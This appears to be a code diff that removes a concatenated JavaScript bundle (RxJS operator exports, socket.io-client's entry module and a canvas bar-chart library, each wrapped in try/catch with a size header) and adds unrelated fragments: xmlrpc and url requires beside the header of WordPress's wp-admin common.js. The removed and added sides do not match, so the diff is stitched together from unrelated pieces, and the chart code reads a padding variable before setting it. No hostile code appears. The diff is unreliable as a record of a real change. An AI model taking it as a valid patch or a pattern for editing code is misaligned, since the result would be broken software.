-var takeWhile_1 = require("./internal/operators/takeWhile");
-Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
-var tap_1 = require("./internal/operators/tap");
-Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
-var throttle_1 = require("./internal/operators/throttle");
-Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
-var throttleTime_1 = require("./internal/operators/throttleTime");
-Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
-var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
-Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
-var timeInterval_1 = require("./internal/operators/timeInterval");
-Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
-var timeout_2 = require("./internal/operators/timeout");
-Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
-var timeoutWith_1 = require("./internal/operators/timeoutWith");
-Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
-var timestamp_1 = require("./internal/operators/timestamp");
-Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
-var toArray_1 = require("./internal/operators/toArray");
-Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
-var window_1 = require("./internal/operators/window");
-Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
-var windowCount_1 = require("./internal/operators/windowCount");
-Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
-var windowTime_1 = require("./internal/operators/windowTime");
-Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
-var windowToggle_1 = require("./internal/operators/windowToggle");
-Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
-var windowWhen_1 = require("./internal/operators/windowWhen");
-Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
-var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
-Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
-var zipAll_1 = require("./internal/operators/zipAll");
-Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
-var zipWith_1 = require("./internal/operators/zipWith");
-Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
-//# sourceMappingURL=index.js.map
-}catch(e){}
-})();
-
-/* >>> socket.io-client (3296 bytes) <<< */
-(function(){
-try{
-"use strict";
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
-exports.io = lookup;
-exports.connect = lookup;
-exports.default = lookup;
-const url_js_1 = require("./url.js");
-const manager_js_1 = require("./manager.js");
-Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
-const socket_js_1 = require("./socket.js");
-Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
-const debug_1 = __importDefault(require("debug")); // debug()
-const debug = (0, debug_1.default)("socket.io-client"); // debug()
+var maps = {};
+
+var url = require( "url" ),
+	xmlrpc = require( "xmlrpc" ),
+	fieldMap = require( "./fields" );
 /**
- * Managers cache.
+ * @output wp-admin/js/common.js
  */
-const cache = {};
-function lookup(uri, opts) {
-    if (typeof uri === "object") {
-        opts = uri;
-        uri = undefined;
-    }
-    opts = opts || {};
-    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
-    const source = parsed.source;
-    const id = parsed.id;
-    const path = parsed.path;
-    const sameNamespace = cache[id] && path in cache[id]["nsps"];
-    const newConnection = opts.forceNew ||
-        opts["force new connection"] ||
-        false === opts.multiplex ||
-        sameNamespace;
-    let io;
-    if (newConnection) {
-        debug("ignoring socket cache for %s", source);
-        io = new manager_js_1.Manager(source, opts);
-    }
-    else {
-        if (!cache[id]) {
-            debug("new io instance for %s", source);
-            cache[id] = new manager_js_1.Manager(source, opts);
-        }
-        io = cache[id];
-    }
-    if (parsed.query && !opts.query) {
-        opts.query = parsed.queryKey;
-    }
-    return io.socket(parsed.path, opts);
-}
-// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
-// namespace (e.g. `io.connect(...)`), for backward compatibility
-Object.assign(lookup, {
-    Manager: manager_js_1.Manager,
-    Socket: socket_js_1.Socket,
-    io: lookup,
-    connect: lookup,
-});
+
+/* global setUserSetting, ajaxurl, alert, confirm, pagenow */
+/* global columns, screenMeta */
+
 /**
- * Protocol version.
+ *  Adds common WordPress functionality to the window.
  *
- * @public
+ *  @param {jQuery} $        jQuery object.
+ *  @param {Object} window   The window object.
+ *  @param {mixed} undefined Unused.
  */
-var socket_io_parser_1 = require("socket.io-parser");
-Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
-var engine_io_client_1 = require("engine.io-client");
-Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
-Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
-Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
-Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
-Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
-Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });
+( function( $, window, undefined ) {
+	var $document = $( document ),
+		$window = $( window ),
+		$body = $( document.body ),
+		__ = wp.i18n.__,
+		sprintf = wp.i18n.sprintf;
 
-module.exports = lookup;
-
-}catch(e){}
-})();
-
-/* >>> chartjs (36878 bytes) <<< */
-(function(){
-try{
-/*global module:true*/
-'use strict';
-
-Math.log2 = Math.log2 || function(x) {
-  return Math.log(x) / Math.LN2;
-};
-
-Math.log10 = Math.log10 || function(x) {
-  return Math.log(x) / Math.LN10;
-};
-
-(function() {
-  var Helpers = {
-    avg: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        v += arr[index];
-      }
-      return v / arr.length;
-    },
-    min: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0];
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 < v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    max: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    upperMax: function(arr) {
-      var v = 0;
-      for (var index = 0; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (Array.isArray(v2)) v2 = Helpers.max(v2);
-        if (v2 > v) v = v2;
-      }
-      return Math.max(0, v);
-    },
-    lowerMin: function(arr) {
-      if (arr.length === 0) return 0;
-      var v = arr[0] || Infinity;
-      if (Array.isArray(v)) v = Helpers.lowerMin(v);
-      for (var index = 1; index < arr.length; ++index) {
-        var v2 = arr[index];
-        if (v2 == null) continue;
-        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
-        if (v2 < v) v = v2;
-      }
-      if (isNaN(v) || !isFinite(v)) v = 0;
-      return Math.max(0, v);
-    },
-    niceNumbers: function(range, round) {
-      var exponent = Math.floor(Math.log10(range));
-      var fraction = range / Math.pow(10, exponent);
-      var niceFraction;
-      if (round) {
-        if (fraction < 1.5) niceFraction = 1;
-        else if (fraction < 3) niceFraction = 2;
-        else if (fraction < 7) niceFraction = 5;
-        else niceFraction = 10;
-      } else {
-        if (fraction <= 1.0) niceFraction = 1;
-        else if (fraction <= 2) niceFraction = 2;
-        else if (fraction <= 5) niceFraction = 5;
-        else niceFraction = 10;
-      }
-      return niceFraction * Math.pow(10, exponent);
-    },
-    getLinearTicks: function(min, max, maxTicks) {
-      var range = Helpers.niceNumbers(max - min, false);
-      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
-      return [
-        Math.floor(min / tickSpacing) * tickSpacing,
-        Math.ceil(max / tickSpacing) * tickSpacing,
-        tickSpacing
-      ];
-    },
-    getFont: function(options) {
-      options.style = options.style || 'normal';
-      options.variant = options.variant || 'normal';
-      options.weight = options.weight || 'lighter';
-      options.size = options.size || '12';
-      options.family = options.family || 'Arial';
-      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
-    },
-    getAxisRatio: function(min, max, value) {
-      return (value - min) / (max - min);
-    }
-  };
-
-  var BarChart = (function() {
-    function BarChart(ctx, options) {
-      this.mouseListeners = [];
-      this.currentHint = null;
-      this.fillRegions = []
-      this.options = {
-        font: 'Helvetica',
-        fontWeight: 'normal',
-        fontSizeTitle: 24,
-        fontSizeAxes: 20,
-        fontSizeTicks: 18,
-        fontSizeLabels: 18,
-        fontDataTags: 18,
-        fontSizeLegend: 18,
-        fontSizeHint: 18,
-        paddingPercentBars: 0.10,
-        paddingPercentTicks: 0.15,
-        paddingPixelsVertical: 10,
-        paddingPixelsHorizontal: 10,
-        paddingPixelsTicks: 10,
-        maxWidthBars: 0,
-        fillColorBackground: 'rgb(255, 255, 255)',
-        strokeColorBars: 'rgb(0, 0, 0)',
-        fillColorBars: 'rgba(180, 180, 180, 0.25)',
-        scaleStyle: 'linear',
-        barStyle: 'none',
-        stackedBarPadding: 3,
-        defaultMaxTick: 0,
-        pixelsLegendSquare: 10,
-        radiusDot: 5,
-        fillColorLegend: 'rgb(230, 230, 230)',
-        tickFormatter: null,
-        tickFormatterMeasure: null,
-        fillRegion: 'normal'
-      };
-      options = options || { };
-      for (var key in this.options) {
-        if (options.hasOwnProperty(key)) this.options[key] = options[key];
-      }
-      this.ctx = ctx;
-      this.content = { };
-      this.labelPositions = { }
-    }
-
-    BarChart.prototype.update = function(content) {
-      if (typeof content !== 'object') {
-        throw new Error('Collections must be objects.');
-      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
-        throw new Error('Collection must specify labels and data.');
-      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
-        throw new Error('Labels and data must be arrays.');
-      } else if (content.labels.length !== content.data.length) {
-        throw new Error('Labels and data length must match.');
-      }
-      content._data_standard_deviation = [];
-      content._data_standard_error = [];
-      for (var i = 0; i < content.data.length; ++i) {
-        var isArr = Array.isArray(content.data[i]);
-        if (this.options.scaleStyle === 'log2') {
-          if (isArr) {
-            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
-          } else content.data[i] = Math.log2(content.data[i]);
-        }
-        if (isArr) {
-          var mean = Helpers.avg(content.data[i]);
-          var acc = 0;
-          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
-          acc = Math.sqrt(acc / (content.data[i].length - 1));
-          content._data_standard_deviation.push(acc);
-          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
-        } else {
-          content._data_standard_deviation.push(0);
-          content._data_standard_error.push(0);
-        }
-      }
-      this.content = content;
-      this.redraw();
-    };
-
-    BarChart.prototype.redraw = function() {
-      setTimeout(function() {
-        this._draw();
-      }.bind(this), 0);
-    };
-
-    BarChart.prototype.mousemove = function(x, y) {
-      var res = null;
-      for (var index = 0; index < this.mouseListeners.length; ++index) {
-        if ((res = this.mouseListeners[index](x, y))) break;
-      }
-      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
-        if (this.currentHint !== null) {
-          this.currentHint = null;
-          this.redraw();
-        }
-        return;
-      }
-      var ch = this.currentHint;
-      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
-        this.currentHint = res;
-        this.redraw();
-      }
-    };
-
-    BarChart.prototype._draw = function() {
-      var labelPositions = { }
-      this.mouseListeners = [];
-      this.fillRegions = [];
-
-      var options = this.options;
-      var ctx = this.ctx, content = this.content;
-      var width = ctx.canvas.width, height = ctx.canvas.height;
-      ctx.clearRect(0, 0, width, height);
-      ctx.translate(-0.5, -0.5);
-      var remainingWidth = width, remainingHeight = height;
-      var index;
-
-      if (options.fillColorBackground != null) {
-        ctx.save();
-        ctx.fillStyle = options.fillColorBackground;
-        ctx.fillRect(0, 0, width, height);
-        ctx.restore();
-      }
-
-      var topYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      /* Draw title of bar chart */
-      if (content.title != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
-        ctx.textAlign = 'center';
-        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
-        ctx.restore();
-        remainingHeight -= options.fontSizeTitle * 1.25;
-        topYPadding += options.fontSizeTitle * 1.25;
-      }
-
-      /* Compute required left padding */
-      var leftXPadding = options.paddingPixelsVertical;
-      remainingWidth  -= options.paddingPixelsVertical;
-
-      var leftXDrawYLabel = null;
-      if (content.yAxis != null) {
-        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
-        remainingWidth -= options.fontSizeAxes * 1.25;
-        leftXPadding += options.fontSizeAxes * 1.25;
-      }
-
-      ctx.save();
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      var maxChartValue, minChartValue;
-      if (options.barStyle === 'stacked') {
-        maxChartValue = 0;
-        minChartValue = Infinity;
-        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
-          var doB;
-          if (Array.isArray(doB = content.data[cmIndex])) {
-            var tempSum = 0;
-            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
-            maxChartValue = Math.max(maxChartValue, tempSum);
-            minChartValue = Math.min(minChartValue, tempSum);
-          } else {
-            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
-            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
-          }
-        }
-      } else {
-        maxChartValue = Helpers.upperMax(content.data);
-        minChartValue = Helpers.lowerMin(content.data);
-      }
-      if (options.scaleStyle.indexOf('adaptive') === 0) {
-        if (options.scaleStyle.indexOf(':') !== -1) {
-          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
-          minChartValue *= floater;
-          maxChartValue *= 1 + (1 - floater) / 2.0;
-        }
-      } else minChartValue = 0;
-      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
-      if (content.bars != null && Array.isArray(content.bars)) {
-        for (index = 0; index < content.bars.length; ++index) {
-          var cbv = content.bars[index].value;
-          if (isNaN(cbv)) continue;
-          maxChartValue = Math.max(maxChartValue, cbv);
-          minChartValue = Math.min(minChartValue, cbv);
-        }
-      }
-      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
-      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
-      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
-      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
-      remainingWidth -= maxYAxisTickWidth;
-      leftXPadding += maxYAxisTickWidth;
-      ctx.restore();
-
-      var rightXPadding = options.paddingPixelsVertical;
-      remainingWidth -= options.paddingPixelsVertical;
-
-      /* Draw legend */
-      if (content.legend != null && Array.isArray(content.legend)) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
-        var maxLWidth = 0;
-        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
-        }
-        maxLWidth = Math.ceil(maxLWidth);
-        maxLWidth += options.pixelsLegendSquare + 8;
-        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
-        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
-        remainingHeight -= lLReqHeight;
-        bottomYPadding += lLReqHeight;
-
-        ctx.strokeStyle = 'rgb(0, 0, 0)';
-        ctx.fillStyle = options.fillColorLegend;
-        var bSX, bSY;
-        ctx.beginPath();
-        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
-        ctx.lineTo(bSX + remainingWidth, bSY);
-        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY + lLReqHeight);
-        ctx.lineTo(bSX, bSY);
-        ctx.stroke();
-        ctx.fill();
-
-        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
-          var legLine = Math.floor(lIndex / legendEntriesPerLine);
-          var legCol = lIndex % legendEntriesPerLine;
-          ctx.fillStyle = content.legend[lIndex].color;
-          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
-          ctx.beginPath();
-          ctx.moveTo(boxX, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
-          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
-          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
-          ctx.lineTo(boxX, boxY);
-          ctx.fill();
-          ctx.stroke();
-
-          ctx.textAlign = 'left';
-          ctx.fillStyle = 'rgb(0, 0, 0)';
-          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
-        }
-
-        ctx.restore();
-      }
-
-      /* Draw x-axis label of bar chart */
-      var bottomYPadding = options.paddingPixelsHorizontal;
-      remainingHeight -= options.paddingPixelsHorizontal;
-      if (content.xAxis != null) {
-        ctx.save();
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
-        remainingHeight -= options.fontSizeAxes * 1.5;
-        bottomYPadding += options.fontSizeAxes * 1.5;
-        ctx.restore();
-      }
-
-      var widthPerBar = remainingWidth / content.data.length;
-
-      /* Draw x-axis top labels */
-      if (content.topLabels != null) {
-        ctx.save();
-        ctx.textAlign = 'center';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        remainingHeight -= options.fontSizeLabels * 1.5;
-        topYPadding += options.fontSizeLabels * 1.5;
-        for (index = 0; index < content.topLabels.length; ++index) {
-          ctx.fillText(
-            content.topLabels[index],
-            leftXPadding + index * widthPerBar + widthPerBar / 2,
-            topYPadding - options.fontSizeLabels / 2
-          );
-        }
-        ctx.restore();
-      }
-
-      /* Draw x-axis labels */
-      ctx.save();
-      var reqWidth = 0;
-      if (content.dataTags != null) {
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
-        var dataTags = content.dataTags;
-        for (index = 0; index < dataTags.length; ++index) {
-          if (Array.isArray(dataTags[index])) {
-            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
-              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
-            }
-          } else {
-            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
-          }
-        }
-      }
-
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
-      var wwh = widthPerBar - computedBarPadding * 2;
-      if (wwh < reqWidth) {
-        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
-        computedBarPadding = Math.max(0, computedBarPadding);
-      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
-        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
-      }
-      var maxTextWidth = 0, maxTextStackSize = 1;
-      for (index = 0; index < content.labels.length; ++index) {
-        var tLabel = content.labels[index];
-        if (Array.isArray(tLabel)) {
-          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
-          for (index2 = 0; index2 < tLabel.length; ++index2) {
-            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
-          }
-        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
-      }
-      var xLabelsRotated = false;
-      if (maxTextWidth > widthPerBar - computedBarPadding) {
-        ctx.textAlign = 'right';
-        ctx.rotate(Math.PI * 1.5);
-        xLabelsRotated = true;
-      } else {
-        ctx.textAlign = 'center';
-      }
-      var lastLabelY = -options.fontSizeLabels;
-      for (index = 0; index < content.labels.length; ++index) {
-        var cLabel = content.labels[index];
-        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
-        if (xLabelsRotated) {
-          y = topYPadding + remainingHeight - maxTextWidth + 5;
-          y = [x, x = -y][0];
-
-          if (y < lastLabelY + options.fontSizeLabels) continue;
-          lastLabelY = y;
-        }
-        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
-        if (Array.isArray(cLabel)) {
-          if (xLabelsRotated) {
-            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
-            yUp /= 2;
-          }
-          for (index2 = 0; index2 < cLabel.length; ++index2) {
-            ctx.fillText(cLabel[index2], x, y - yUp);
-            yUp -= options.fontSizeLabels;
-          }
-        } else {
-          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
-          ctx.fillText(cLabel, x, y - yUp);
-        }
-      }
-      if (xLabelsRotated) {
-        remainingHeight -= maxTextWidth + 5;
-        bottomYPadding += maxTextWidth + 5;
-      } else {
-        var remVal = options.fontSizeLabels * maxTextStackSize;
-        remVal += options.fontSizeLabels * 0.5;
-        remainingHeight -= remVal;
-        bottomYPadding += remVal;
-      }
-      ctx.restore();
-
-      /* Draw boundaries */
-      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
-      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;
-
-      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
-        xStart: leftXPadding + index * widthPerBar,
-        xEnd: leftXPadding + (1 + index) * widthPerBar,
-        yStart: boundY1, yEnd: boundY2
-      }
-
-      ctx.save();
-      ctx.strokeStyle = 'rgb(0, 0, 0)';
-      ctx.beginPath();
-      if (content.topLabels != null) {
-        ctx.moveTo(boundX2, boundY1);
-        ctx.lineTo(boundX1, boundY1);
-      } else {
-        ctx.moveTo(boundX1, boundY1);
-      }
-      ctx.lineTo(boundX1, boundY2);
-      ctx.lineTo(boundX2, boundY2);
-      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
-      ctx.stroke();
-      ctx.restore();
-
-      /* Draw top label */
-      if (content.topLabel != null) {
-        ctx.save();
-        ctx.textAlign = 'right';
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
-        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
-        ctx.restore();
-      }
-
-      /* Draw y-axis label of bar chart */
-      if (content.yAxis != null) {
-        ctx.save();
-        ctx.rotate(Math.PI * 1.5);
-        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
-        ctx.fillStyle = 'rgb(0, 0, 0)';
-        ctx.textAlign = 'center';
-        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
-        ctx.restore();
-      }
-
-      /* Draw y-axis labels */
-      ctx.save();
-      ctx.fillStyle = 'rgb(0, 0, 0)';
-      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
-      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
-      ctx.textAlign = 'right';
-      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
-      var alpha = maxChartValue / options.fontSizeTicks;
-      maxChartValue = tickMeta[1];
-      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
-      else maxChartValue += alpha;
-      var ticks = [];
-      while (tickMeta[0] <= tickMeta[1]) {
-        ticks.push(tickMeta[0]);
-        tickMeta[0] += tickMeta[2];
-      }
-      for (index = 0; index < ticks.length; ++index) {
-        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
-        if (tickHeight < 0) continue;
-        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
-        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
-        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
-          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        } else {
-          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
-        }
-        if (index == 0) continue;
-        ctx.beginPath();
-        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
-        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
-        ctx.stroke();
-      }
-      ctx.restore();
-
-      if (content.bars != null && Array.isArray(content.bars)) {
-        ctx.save();
-        for (index = 0; index < content.bars.length; ++index) {
-          var cBar = content.bars[index];
-          if (cBar.value > maxChartValue) continue;
-          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
-          ctx.strokeStyle = cBar.style;
-          ctx.fillStyle = cBar.style;
-          ctx.beginPath();
-          ctx.moveTo(boundX1, renderBarY);
-          ctx.lineTo(boundX2, renderBarY);
-          ctx.stroke();
-          ctx.fill();
-        }
-        ctx.restore();
-      }
-
-      /* Draw bars */
-      ctx.save();
-      var lastData = null;
-      for (index = 0; index < content.data.length; ++index) {
-        var fillColorForIndex = null;
-        var strokeColorForIndex = null;
-        if (content.fillColor != null) {
-          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
-          else ctx.fillStyle = content.fillColor;
-        } else ctx.fillStyle = options.fillColorBars;
-        if (content.strokeColor != null) {
-          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
-          else ctx.strokeStyle = content.strokeColor;
-        } else ctx.strokeStyle = options.strokeColorBars;
-        var v = content.data[index];
-        var vIsArr = Array.isArray(v);
-        var renderStartX = leftXPadding + widthPerBar * index;
-        if (vIsArr && options.barStyle === 'stacked') {
-          var runningValue = 0, lastHeight = 0;
-          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
-            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
-              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
-            }
-            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
-              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
-            }
-
-            runningValue += v[drawIndex];
-            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
-            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
-            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
-              lastHeight = renderBarHeight;
-              continue;
-            }
-
-            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
-            var tSX, tSY;
-            var tEX, tEY;
-            ctx.beginPath();
-            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
-            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
-            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
-            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
-            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
-            ctx.stroke();
-            ctx.fill();
-            var hint;
-            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
-              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
-                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
-                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
-                if (x < minX || x > maxX || y < minY || y > maxY) return null;
-                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
-              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
-            }
-
-            var tagText;
-            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
-              var oFS = ctx.fillStyle;
